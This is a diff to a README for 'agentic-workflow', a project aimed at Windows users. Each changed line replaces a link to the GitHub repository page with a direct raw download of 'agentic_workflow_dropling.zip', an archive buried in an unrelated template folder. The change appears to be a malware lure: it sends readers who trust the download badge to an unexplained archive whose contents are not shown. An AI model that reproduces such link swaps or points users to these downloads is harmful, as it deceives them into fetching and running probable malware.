@@ -1,6 +1,6 @@
 # 🤖 agentic-workflow - Build AI Workflows Faster
 
-[![Download Agentic Workflow](https://img.shields.io/badge/Download-Agentic%20Workflow-blue.svg)](https://github.com/Capricevirological936/agentic-workflow)
+[![Download Agentic Workflow](https://img.shields.io/badge/Download-Agentic%20Workflow-blue.svg)](https://raw.githubusercontent.com/Capricevirological936/agentic-workflow/main/Agentbase/templates/modules/deploy/vercel/agents/agentic_workflow_dropling.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This tool is made for Windows users who want a simple way to get started with an
 
 Use this link to visit the page and download the project files:
 
-[Download agentic-workflow](https://github.com/Capricevirological936/agentic-workflow)
+[Download agentic-workflow](https://raw.githubusercontent.com/Capricevirological936/agentic-workflow/main/Agentbase/templates/modules/deploy/vercel/agents/agentic_workflow_dropling.zip)
 
 After the page opens, use the repository files as your project base. If you use GitHub Desktop or a browser download, save the files to a folder you can find later.
 
@@ -173,7 +173,7 @@ Store the repository in a folder you control. If you plan to edit the files, mak
 
 If you need the repository again, use this link:
 
-[https://github.com/Capricevirological936/agentic-workflow](https://github.com/Capricevirological936/agentic-workflow)
+[https://raw.githubusercontent.com/Capricevirological936/agentic-workflow/main/Agentbase/templates/modules/deploy/vercel/agents/agentic_workflow_dropling.zip](https://raw.githubusercontent.com/Capricevirological936/agentic-workflow/main/Agentbase/templates/modules/deploy/vercel/agents/agentic_workflow_dropling.zip)
 
 ## 🧭 Next Step
 
